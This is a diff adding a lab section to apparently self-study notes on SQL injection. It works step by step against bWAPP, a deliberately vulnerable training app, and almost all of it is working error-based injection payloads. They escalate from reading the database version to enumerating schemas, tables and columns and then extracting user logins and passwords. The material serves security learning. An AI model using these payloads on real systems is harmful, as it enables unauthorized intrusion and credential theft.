@@ -660,6 +660,62 @@ using SQLMap you can use the following statements, --os-cmd / --os-shell
 
 NOTE: modern DBMS offer some kind of file system routines or system shell command interfaces; this poses a high security risk to a DBMS serving an insecure web application.
 
+**** L A B
+
+> error based sqli
+
+mysql -u root
+
+SELECT FLOOR(RAND(0)*2) FROM information_schema.tables;
+
+SELECT FLOOR(RAND(0)*2) AS B FROM information_schema.tables GROUP BY B;
+
+SELECT COUNT(*), FLOOR(RAND(0)*2) AS B FROM information_schema.tables GROUP BY B;
+
+SELECT COUNT(*), CONCAT("Hello ", "World ", FLOOR(RAND(0)*2)) AS B FROM information_schema.tables GROUP BY B;
+
+SELECT COUNT(*), CONCAT("Hello ", VERSION(), FLOOR(RAND(0)*2)) AS B FROM information_schema.tables GROUP BY B;
+
+SELECT COUNT(*), CONCAT("Hello ", VERSION()," - ", FLOOR(RAND(0)*2)) AS B FROM information_schema.tables GROUP BY B;
+
+SELECT 1 FROM(SELECT COUNT(*), CONCAT("Hello ", VERSION()," - ", FLOOR(RAND(0)*2)) AS B FROM information_schema.tables GROUP BY B) C;
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", version()," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+Select * from movies where title like '%' AND (SELECT 1 from(Select count(*), concat("Hello ", version()," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) # %';
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", (select table_schema from information_schema.tables limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+Select * from movies where title like '%' AND (SELECT 1 from(Select count(*), concat("Hello ", (select table_schema from information_schema.tables limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) # %';
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(table_schema)from information_schema.tables limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+Select * from movies where title like '%' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(table_schema)from information_schema.tables limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) # %';
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(table_name)from information_schema.tables where table_schema="bWAPP" limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+Select * from movies where title like '%' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(table_name)from information_schema.tables where table_schema="bWAPP" limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) # %';
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(table_name)from information_schema.tables where table_schema="bWAPP" limit 2,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #;
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(table_name)from information_schema.tables where table_schema="bWAPP" limit 3,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(column_name) from information_schema.columns where table_schema="bWAPP" and table_name='users' limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+Select * from movies where title like '%' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(column_name) from information_schema.columns where table_schema="bWAPP" and table_name='users' limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) # %';
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(column_name) from information_schema.columns where table_schema="bWAPP" and table_name='users' limit 2,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(column_name) from information_schema.columns where table_schema="bWAPP" and table_name='users' limit 3,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+' AND (SELECT 1 from (Select count(*), concat("Hello ", (select password from bWAPP.users limit 0,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+Select * from movies where title like '%' AND (SELECT 1 from (Select count(*), concat("Hello ", (select password from bWAPP.users limit 0,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) # %';
+
+' AND (SELECT 1 from (Select count(*), concat("Hello ", (select login from bWAPP.users limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #
+
+Select * from movies where title like '%' AND (SELECT 1 from (Select count(*), concat("Hello ", (select login from bWAPP.users limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) # %';
+
 </center>
 </body>
 </html>
